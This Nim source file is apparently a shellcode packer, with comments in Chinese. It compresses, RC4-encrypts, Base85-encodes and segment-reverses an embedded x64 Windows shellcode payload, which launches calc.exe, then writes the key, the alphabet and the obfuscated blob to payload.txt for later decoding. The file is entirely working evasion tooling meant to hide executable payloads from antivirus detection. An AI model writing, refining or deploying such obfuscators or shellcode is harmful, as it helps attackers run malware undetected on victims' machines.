import zippy       # 用于 zlib 压缩/解压
import std/[syncio, strutils, random]
# ==========================================
# RC4 加密算法 (Drop 1024)
# ==========================================
proc rc4CryptDrop1024(data: string, key: string): string =
  var S: array[0..255, int]
  for i in 0..255: S[i] = i
  var j = 0
  let keyLength = key.len
  
  for i in 0..255:
    j = (j + S[i] + ord(key[i mod keyLength])) mod 256
    swap(S[i], S[j])
    
  var i = 0
  j = 0
  for _ in 1..1024:
    i = (i + 1) mod 256
    j = (j + S[i]) mod 256
    swap(S[i], S[j])
    
  var outResult = newString(data.len)
  for idx in 0..<data.len:
    i = (i + 1) mod 256
    j = (j + S[i]) mod 256
    swap(S[i], S[j])
    let k = S[(S[i] + S[j]) mod 256]
    outResult[idx] = chr(ord(data[idx]) xor k)
  return outResult

# ==========================================
# Base85 编码算法 (传入 b85chars 字典)
# ==========================================
proc encode85(data: string, b85chars: string): string =
  if data.len == 0: return ""
  result = ""
  let remainder = data.len mod 4
  let mainLen = data.len - remainder
  
  var idx = 0
  while idx < mainLen:
    var value: uint32 = (ord(data[idx]).uint32 shl 24) or
                        (ord(data[idx+1]).uint32 shl 16) or
                        (ord(data[idx+2]).uint32 shl 8) or
                        (ord(data[idx+3]).uint32)
    var chunk = ""
    for _ in 1..5:
      let rem = value mod 85
      chunk = b85chars[rem.int] & chunk
      value = value div 85
    result.add(chunk)
    idx += 4
    
  if remainder > 0:
    var value: uint32 = 0
    for i in 0..<remainder:
      value = value or (ord(data[mainLen + i]).uint32 shl (24 - i * 8))
    var chunk = ""
    for _ in 1..5:
      let rem = value mod 85
      chunk = b85chars[rem.int] & chunk
      value = value div 85
    result.add(chunk[0..remainder])

# ==========================================
# DJB2 哈希与映射步长
# ==========================================
proc getSegmentSize(key: string): int =
  var hash: uint32 = 5381
  for c in key:
    hash = ((hash shl 5) + hash) + ord(c).uint32
  result = int(hash mod 8) + 4

# 根据步长对字符串进行分段反转
proc reverseSegments(data: string, step: int): string =
  if step <= 1 or data.len == 0: return data
  result = newString(data.len)
  
  var idx = 0
  while idx < data.len:
    let currentStep = min(step, data.len - idx)
    for i in 0..<currentStep:
      result[idx + i] = data[idx + currentStep - 1 - i]
    idx += step

# ==========================================
# 新增重构 1：核心加密与混淆流程抽象
# ==========================================
proc encryptAndConfuse(rawShellcode: string, secretKey: string, b85chars: string): string =
  # 预先计算混淆步长
  let step = getSegmentSize(secretKey)
  echo "=========================================="
  echo "[*] 根据密钥动态计算哈希值..."
  echo "[+] 映射后的混淆分段步长 (4-11): ", step
  echo "=========================================="

  echo "\n[*] 开始正向加密混淆测试..."
  # 1. 压缩
  let compressed = zippy.compress(rawShellcode, dataFormat = dfZlib)
  # 2. 加密
  let encrypted = rc4CryptDrop1024(compressed, secretKey)
  # 3. 编码 (传入 main 函数中定义的字典)
  let encodedNormal = encode85(encrypted, b85chars)
  # 4. 【核心混淆】对 Base85 字符串进行分段反转
  result = reverseSegments(encodedNormal, step)
  echo "[+] 经过 [压缩->RC4->Base85->分段反转] 后的混淆字符串长度: " & $result.len

# ==========================================
# 新增重构 2：文件写入功能抽象
# ==========================================
proc writePayloadToFile(fileName: string, content: string, append: bool = false) =
  try:
    if append:
      # 【追加写模式】：文件不存在会自动创建，存在则在末尾接着写
      let f = open(fileName, fmAppend)
      f.write(content) # 💡 自动连接换行符，防止多段 payload 挤在同一行
      f.close()
      echo "[+] 成功将数据追加写入文件: " & fileName
    else:
      # 【覆盖写模式】：直接使用原有的 writeFile，会抹除旧内容并写入新内容
      writeFile(fileName, content)
      echo "[+] 成功将数据覆盖写入文件: " & fileName
  except IOError:
    echo "[-] 写入文件失败，请检查文件夹读写权限或文件是否被占用！"

proc getRandomChar(charset: string): char =
  let randomIndex = rand(0 ..< charset.len)
  return charset[randomIndex]

proc generateRandomByStr(lengthStr: string, charset: string): string =
  result = ""
  var length: int
  try:
    length = parseInt(lengthStr.strip()) 
  except ValueError:
    echo "[-] 错误: 传入的参数 '" & lengthStr & "' 无法转换为有效的数字！"
    return ""
  if length <= 0:
    return ""
  for _ in 1..length:
    result.add(getRandomChar(charset))
# ==========================================
# 主入口函数
# ==========================================
proc main() =
  let flag = 5
  let charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ01234567"
  let b85chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~"
  let secretKey = "MyCustomSuperSecretKey123!"
  var rawShellcode = ""
  rawShellcode.add("\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51")
  rawShellcode.add("\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52")
  rawShellcode.add("\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72")
  rawShellcode.add("\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0")
  rawShellcode.add("\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41")
  rawShellcode.add("\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b")
  rawShellcode.add("\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48")
  rawShellcode.add("\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44")
  rawShellcode.add("\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41")
  rawShellcode.add("\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0")
  rawShellcode.add("\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1")
  rawShellcode.add("\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44")
  rawShellcode.add("\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44")
  rawShellcode.add("\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01")
  rawShellcode.add("\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59")
  rawShellcode.add("\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41")
  rawShellcode.add("\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48")
  rawShellcode.add("\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d")
  rawShellcode.add("\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5")
  rawShellcode.add("\xbb\xcd\x64\x9f\x68\x41\xba\xa6\x95\xbd\x9d\xff")
  rawShellcode.add("\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0")
  rawShellcode.add("\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89")
  rawShellcode.add("\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00")
  let prefix = generateRandomByStr($flag, charset)
  # 调用文件写入函数
  writePayloadToFile("payload.txt", $flag, false)
  writePayloadToFile("payload.txt", secretKey & "\n", true)
  writePayloadToFile("payload.txt", b85chars, true)
  writePayloadToFile("payload.txt", charset & "\n", true)
  writePayloadToFile("payload.txt", encryptAndConfuse(b85chars, prefix & secretKey, b85chars), true)
  writePayloadToFile("payload.txt", encryptAndConfuse(rawShellcode, prefix & secretKey, b85chars), true)

if isMainModule:
  main()
